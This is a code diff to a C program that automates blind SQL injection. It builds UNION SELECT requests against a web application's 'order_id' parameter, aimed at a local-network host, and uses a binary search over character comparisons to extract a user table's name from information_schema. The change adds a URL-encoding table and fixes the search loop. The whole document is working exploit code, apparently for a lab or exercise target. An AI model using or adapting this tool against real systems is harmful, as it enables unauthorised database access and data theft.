@@ -204,9 +204,9 @@ bool recv_empty(int32_t sockfd) {
     return ptr;
 }
 
-bool send_check_success(char * discovered_name, int i, unsigned char mid, int sockfd) {
+bool send_check_success(const char * discovered_name, int i, const char *mid, int sockfd) {
     char mal_req[2048];
-    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%c%%27%%20LIMIT%%201; HTTP/1.1\r\n"
+    sprintf(mal_req, "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201; HTTP/1.1\r\n"
         "Host: 192.168.1.202\r\n"
         "Connection: Keep-Alive\r\n"
         "\r\n",
@@ -218,25 +218,79 @@ bool send_check_success(char * discovered_name, int i, unsigned char mid, int so
     return recv_empty(sockfd);
 }
 
+const char *url_map[96] = {
+    "%20", // 0x20 Space
+    "%21", // 0x21 !
+    "%22", // 0x22 "
+    "%23", // 0x23 #
+    "%24", // 0x24 $
+    "%25", // 0x25 %
+    "%26", // 0x26 &
+    "%27", // 0x27 '
+    "%28", // 0x28 (
+    "%29", // 0x29 )
+    "%2A", // 0x2A *
+    "%2B", // 0x2B +
+    "%2C", // 0x2C ,
+    "-",   // 0x2D - (Unreserved)
+    ".",   // 0x2E . (Unreserved)
+    "%2F", // 0x2F /
 
-void binary_search(char * discovered_name, int sockfd) {
+    // --- 0x30 to 0x39 (Numbers 0-9 Unreserved) ---
+    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
+
+    // --- 0x3A to 0x40 ---
+    "%3A", // 0x3A :
+    "%3B", // 0x3B ;
+    "%3C", // 0x3C <
+    "%3D", // 0x3D =
+    "%3E", // 0x3E >
+    "%3F", // 0x3F ?
+    "%40", // 0x40 @
+
+    // --- 0x41 to 0x5A (Uppercase A-Z Unreserved) ---
+    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
+    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+
+    // --- 0x5B to 0x60 ---
+    "%5B", // 0x5B [
+    "%5C", // 0x5C \ (Backslash)
+    "%5D", // 0x5D ]
+    "%5E", // 0x5E ^
+    "_",   // 0x5F _ (Unreserved)
+    "%60", // 0x60 `
+
+    // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
+    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+
+    // --- 0x7B to 0x7F ---
+    "%7B", // 0x7B {
+    "%7C", // 0x7C |
+    "%7D", // 0x7D }
+    "~",   // 0x7E ~ (Unreserved)
+    "%7F"  // 0x7F DEL
+};
+
+void binary_search(char final_discovered_name[11], int sockfd) {
 #ifdef __MY_DEBUG__
     int count = 0;
 #endif
+    char discovered_name[33] = {0};
 
     for (int i = 0; i < 10; i++) {
     #ifdef __MY_DEBUG__
         printf("%i--\n", i);
     #endif
-        unsigned char low = 0x20;
-        unsigned char high = 0x80;
+        unsigned char low = 0;
+        unsigned char high = 0x60;
         unsigned char mid;
         while (low < high) {
             mid = (unsigned char)(low + (high - low) / 2);
         #ifdef __MY_DEBUG__
             count++;
         #endif
-            if (send_check_success(discovered_name, i, mid, sockfd)) {
+            if (send_check_success(discovered_name, i, url_map[mid], sockfd)) {
                 high=mid;
             }
             else {
@@ -246,11 +300,11 @@ void binary_search(char * discovered_name, int sockfd) {
             printf("\t%s,%c,%c\n", discovered_name, low, high);
         #endif
         }
-        if (low<=0x7f) {
-            discovered_name[i] = (char) low;
-        } else {
+        if (low>=0x5f) {
             break;
         }
+        strcat(discovered_name, url_map[low]);
+        final_discovered_name[i] = (char) (low + 0x20);
     }
 #ifdef __MY_DEBUG__
     printf("number of queries is: %d\n",count);
